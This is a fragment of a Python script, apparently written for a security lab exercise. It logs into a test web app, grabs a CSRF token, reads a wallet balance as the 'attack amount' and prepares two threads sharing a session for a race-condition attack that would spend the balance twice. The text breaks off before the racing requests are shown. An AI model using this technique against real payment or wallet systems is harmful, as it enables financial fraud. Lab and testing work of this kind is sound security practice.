BASE = os.environ["LAB30_URL"].rstrip("/")
jar = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

def jget(opener, path):
    req = urllib.request.Request(BASE + path, headers={"Accept": "application/json"})
    try:
        r = opener.open(req, timeout=10)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

def post_form(opener, path, data):
    req = urllib.request.Request(BASE + path, data=urllib.parse.urlencode(data).encode(),
                                 headers={"Accept": "application/json"})
    try:
        r = opener.open(req, timeout=10)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

# login once
op.open(BASE + "/auth/login.php", timeout=10).read()
op.open(BASE + "/auth/login.php", timeout=10, data=urllib.parse.urlencode({
    "username": os.environ["LAB30_USER"], "password": os.environ["LAB30_PASSWORD"],
}).encode()).read()
m = op.open(BASE + "/orders/index.php", timeout=10)
print("LOGIN", m.status, "/auth/login.php" not in m.url)

html = op.open(BASE + "/wallet/index.php", timeout=10).read().decode("utf-8", "replace")
tok = re.search(r'name="csrf" value="([0-9a-fA-F]+)"', html)
csrf = tok.group(1) if tok else ""
print("CSRF_FOUND", bool(tok))

st, body = jget(op, "/wallet/index.php")
print("BASELINE", st, body[:500])
balance = json.loads(body)["balance"]
print("ATTACK_AMOUNT", balance, "THREADS 2")

# capture cookies for independent per-thread openers
cookies = [(c.name, c.value) for c in jar]
results = []
barrier = threading.Barrier(2)
lock = threading.Lock()

def worker(i):
    cj = http.cookiejar.CookieJar()
    for n, v in cookies:
        cj.set_cookie(http.cookiejar.Cookie(version=0, name=n, value=v, port=None, port_specified=False,
            domain="lab30", domain_specified=False, domain_initial_dot=False, path="/", path_specified=True,
            secure=False, expires=None, discard=True, comment=None, comment_url=None, rest={}, rfc2109=False))
